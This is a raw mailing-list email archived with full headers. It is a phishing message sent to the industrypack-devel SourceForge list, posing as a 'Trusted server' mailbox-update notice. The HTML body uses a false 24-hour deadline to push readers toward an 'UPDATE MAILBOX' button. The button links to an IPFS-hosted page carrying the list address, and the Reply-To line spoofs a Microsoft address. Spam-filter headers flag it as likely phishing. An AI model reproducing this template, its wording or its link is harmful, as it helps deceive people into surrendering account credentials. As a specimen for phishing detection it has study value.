Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id D375F8C6D11
	for <lists+industrypack-devel@lfdr.de>; Wed, 15 May 2024 22:06:21 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1s7KtJ-0006Av-7r
	for lists+industrypack-devel@lfdr.de;
	Wed, 15 May 2024 20:06:20 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <noreply@microsoft.com>) id 1s7KtH-0006Ap-V4
 for industrypack-devel@lists.sourceforge.net;
 Wed, 15 May 2024 20:06:19 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=hX88QoVPH8ljukyNsTkQSC0Hcw8wyzLlbPtGw8kYPgI=; b=hXAeusE6vrSsbqvzrtNN530BuM
 f/A9T+y60Ju1/vfxN6YJz/wcIlEaj5q2ZedVDIEfQ1RelDpCzdZP+SgOvMv7lew7lzSDDW4H3EBD6
 ioOCr8D0KuDhTLNzuhXmhjm2Mc7a3Vhzy0axZ2rfRQFigq7YL0PtSy0KKxKpcA9ZpCJU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=hX88QoVPH8ljukyNsTkQSC0Hcw8wyzLlbPtGw8kYPgI=; b=W
 +1nVRyRIudxjFJj/cqP/kQb098pYMzQ6QGJN2USULaf1z7rd9P+EZCs3jnzO3n/7/j0WhSIU6pmGx
 Cfc9+Zd6IJ3lN6i3NbErNk2t+AU0OBmrT2hYxu8MpFKEKLd6mbmzF925tjKLkyvt5c7AxAsdTk7Bd
 0pprxVt6PbSxT9cQ=;
Received: from [195.19.93.40] (helo=pev.egyptiust.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1s7KtH-0007af-5b for industrypack-devel@lists.sourceforge.net;
 Wed, 15 May 2024 20:06:19 +0000
Received: from microsoft.com (localhost [IPv6:::1])
 by pev.egyptiust.com (Postfix) with ESMTP id EEA5C2B6044
 for <industrypack-devel@lists.sourceforge.net>;
 Wed, 15 May 2024 22:32:48 +0300 (MSK)
To: industrypack-devel@lists.sourceforge.net
Date: 15 May 2024 22:32:48 +0300
Message-ID: <20240515223248.EC8D69790B2B6836@microsoft.com>
MIME-Version: 1.0
X-Spam-Score: 4.5 (++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Message from Trusted server. Valued industrypack-devel, You
 have an important mailbox update, click below to complete your mailbox update.
 UPDATE MAILBOX 
 Content analysis details:   (4.5 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: cloudflare-ipfs.com]
 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 2.5 URI_CLOUDFLAREIPFS     References Interplanetary File System PtP
 content via CloudFlare, likely phishing
 0.4 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
 0.2 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
 0.0 NORDNS_LOW_CONTRAST    No rDNS + hidden text
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only 0.0 URI_PHISH              Phishing using web form
X-Headers-End: 1s7KtH-0007af-5b
Subject: [Industrypack-devel] Important mailbox update -
 industrypack-devel@lists.sourceforge.net.
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: "lists.sourceforge.net via Industrypack-devel"
 <industrypack-devel@lists.sourceforge.net>
Reply-To: "lists.sourceforge.net" <noreply@microsoft.com>
Content-Type: multipart/mixed; boundary="===============2270109010848851525=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============2270109010848851525==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY>
<DIV class=3Dgmail-rcmBody style=3D'FONT-SIZE: 12px; FONT-FAMILY: "Lucida G=
rande", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SP=
ACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT=
-STYLE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: 8px; LETTER-SPACING: normal;=
 BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial'>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: wf; BOR=
DER-RIGHT-WIDTH: 0px; BORDER-TOP-COLOR: ; WIDTH: 477px; VERTICAL-ALIGN: bas=
eline; BORDER-BOTTOM-WIDTH: 0px; FLOAT: left; COLOR: rgb(32,31,30); PADDING=
-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 0px; MARGIN: 0px 0px 0px 18px=
; PADDING-RIGHT: 5px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; font-va=
riant-numeric: inherit; font-variant-east-asian: inherit; border-image: non=
e 100% / 1 / 0 stretch; text-size-adjust: auto">
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 13px; BORDER-RIGHT-WIDTH: =
0px; BORDER-TOP-COLOR: ; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px=
; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 3px; MARGIN: 0px; PA=
DDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(244,248,245)=
; font-variant-ligatures: inherit; font-variant-caps: inherit; font-stretch=
: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit;=
 border-image: none 100% / 1 / 0 stretch;=20
font-variant-alternates: inherit"><SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FO=
NT-FAMILY: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORD=
ER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: =
0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-variant-c=
aps: inherit; font-stretch: inherit; border-image: none 100% / 1 / 0 stretc=
h">Mes<WBR>sage from Trusted server.</SPAN></DIV></DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: wf; BOR=
DER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; C=
OLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0=
px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: i=
nherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; bo=
rder-image: none 100% / 1 / 0 stretch; text-size-adjust: auto">
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 12px; HEIGHT: 30px; FONT-F=
AMILY: inherit; BORDER-RIGHT-WIDTH: 0px; BORDER-TOP-COLOR: ; WIDTH: 5px; VE=
RTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 2px; PADD=
ING-TOP: 2px; PADDING-LEFT: 2px; MARGIN: 0px; PADDING-RIGHT: 2px; BORDER-TO=
P-WIDTH: 0px; BACKGROUND-COLOR: rgb(86,166,89); font-variant-caps: inherit;=
 font-stretch: inherit; border-image: none 100% / 1 / 0 stretch"></DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 16px; FONT-FAMILY: Calibri=
, sans-serif, serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: ba=
seline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; =
PADDING-LEFT: 20px; MARGIN: 0px; PADDING-RIGHT: 20px; BORDER-TOP-WIDTH: 0px=
; font-variant-ligatures: inherit; font-variant-caps: inherit; font-stretch=
: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit;=
 border-image: none 100% / 1 / 0 stretch;=20
font-variant-alternates: inherit">
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 12px; FONT-FAMILY: inherit=
; BORDER-RIGHT-WIDTH: 0px; BORDER-TOP-COLOR: ; VERTICAL-ALIGN: baseline; BO=
RDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT=
: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-variant=
-caps: inherit; font-stretch: inherit; border-image: none 100% / 1 / 0 stre=
tch">
<P style=3D"FONT-FAMILY: inherit"><BR></P></DIV></DIV></DIV></DIV>
<DIV style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial; WHITE-SPACE: normal; WOR=
D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROU=
ND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norma=
l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
on-thickness: initial; text-decoration-style: initial; text-decoration-colo=
r: initial">
<TABLE style=3D"BORDER-COLLAPSE: collapse" height=3D"100%" cellSpacing=3D0 =
cellPadding=3D0 width=3D"100%" align=3Dcenter bgColor=3D#f5f7f8 border=3D0>=

<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: inherit; MARGIN: 0px" height=3D3=
0 vAlign=3Dtop align=3Dcenter><BR></TD></TR>
<TR>
<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dt=
op width=3D600 align=3Dcenter>
<TABLE style=3D"MAX-WIDTH: 600px; BORDER-COLLAPSE: collapse; border-image: =
none 100% / 1 / 0 stretch" cellSpacing=3D0 cellPadding=3D0 align=3Dcenter b=
order=3D0>
<TBODY>
<TR>
<TD style=3D"MAX-WIDTH: 600px; FONT-FAMILY: inherit; MARGIN: 0px" bgColor=
=3D#ffffff vAlign=3Dtop width=3D600 align=3Dcenter>
<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
width=3D"100%" align=3Dcenter border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop align=3Dcenter=
>
<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
width=3D"92%" align=3Dcenter border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop align=3Dcenter=
>
<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
width=3D"100%" align=3Dcenter>
<TBODY>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D30><BR></TD></TR>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D32><BR></TD></TR>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop>
<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
width=3D"90%">
<TBODY>
<TR>
<TD style=3D"FONT-FAMILY: Roboto, Arial; FONT-WEIGHT: 600; COLOR: rgb(51,51=
,51); MARGIN: 0px; LINE-HEIGHT: 18px" vAlign=3Dtop>Valued industrypack-deve=
l,</TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop>
<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
width=3D"100%" border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D25><BR></TD></TR>
<TR>
<TD style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, Arial; COLOR: rgb(102,10=
2,102); MARGIN: 0px; LINE-HEIGHT: 19px"><FONT style=3D"VERTICAL-ALIGN: inhe=
rit"><FONT style=3D"VERTICAL-ALIGN: inherit">You have an important mailbox =
update, click below to complete your mailbox update.</FONT></FONT></TD></TR=
></TBODY></TABLE></TD></TR>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D20 vAlign=3Dtop al=
ign=3Dleft><BR></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop align=3Dcenter=
><BR>
<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
align=3Dcenter border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" bgColor=3D#f3565d height=3D=
40 width=3D288 align=3Dcenter><A style=3D"FONT-SIZE: 14px; FONT-FAMILY: Rob=
oto, Arial; TEXT-TRANSFORM: uppercase; COLOR: rgb(255,255,255); OUTLINE-WID=
TH: medium; OUTLINE-STYLE: none; DISPLAY: block; OUTLINE-COLOR: invert; LIN=
E-HEIGHT: 40px; text-decoration-line: none" href=3D"https://cloudflare-ipfs=
=2Ecom/ipfs/bafkreif46ea45sy2tathyc2mfmgr52woktxazskk3oxhejgn3lfkwxc6o4#ind=
ustrypack-devel@lists.sourceforge.net" target=3D_blank>UPDATE MAILBOX</A></=
TD></TR></TBODY>
</TABLE><BR></TD></TR>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D20 vAlign=3Dtop al=
ign=3Dleft><BR></TD></TR>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop>
<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
width=3D"100%" border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, Arial; COLOR: rgb(102,10=
2,102); MARGIN: 0px; LINE-HEIGHT: 19px"><FONT style=3D"VERTICAL-ALIGN: inhe=
rit"><FONT style=3D"VERTICAL-ALIGN: inherit">
You have 24 hours to complete the update to prevent your mailbox from being=
 logged out and prevent loss of important data.&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></FONT>
 </TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD style=3D"FONT-FAMILY: inherit; BORDER-BOTTOM: rgb(238,238,238) 1px soli=
d; MARGIN: 0px" height=3D25><BR></TD></TR>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D23><BR></TD></TR>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" vAlign=3Dtop>
<TABLE style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
width=3D"90%">
<TBODY>
<TR>
<TD style=3D"FONT-FAMILY: Roboto, Arial; FONT-WEIGHT: 600; COLOR: rgb(51,51=
,51); MARGIN: 0px; LINE-HEIGHT: 18px" vAlign=3Dtop>lists.sourceforge.net Ad=
ministrator Services. All Rights Reserved</TD></TR></TBODY></TABLE></TD></T=
R>
<TR>
<TD style=3D"FONT-FAMILY: inherit; MARGIN: 0px" height=3D32><BR></TD></TR><=
/TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></T=
R>
<TR>
<TD style=3D"FONT-SIZE: 12px; FONT-FAMILY: inherit; MARGIN: 0px" height=3D3=
0 vAlign=3Dtop align=3Dcenter><BR></TD></TR></TBODY></TABLE></DIV></BODY></=
HTML>


--===============2270109010848851525==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2270109010848851525==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2270109010848851525==--
